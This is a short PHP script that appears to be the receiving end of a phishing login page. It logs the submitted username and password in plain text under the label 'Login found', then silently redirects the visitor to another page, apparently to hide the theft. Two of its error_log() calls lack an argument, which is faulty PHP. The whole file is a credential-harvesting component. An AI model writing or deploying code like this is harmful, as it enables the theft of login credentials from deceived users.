<?php
error_log("-----------------------------------------------------------------------");
error_log("Login found");
error_log();
error_log("Account: " . $_POST['username'] . " \n Pass: " . $_POST['password'] );
error_log();
error_log("-----------------------------------------------------------------------");
header('Location:/index3.html');
exit();
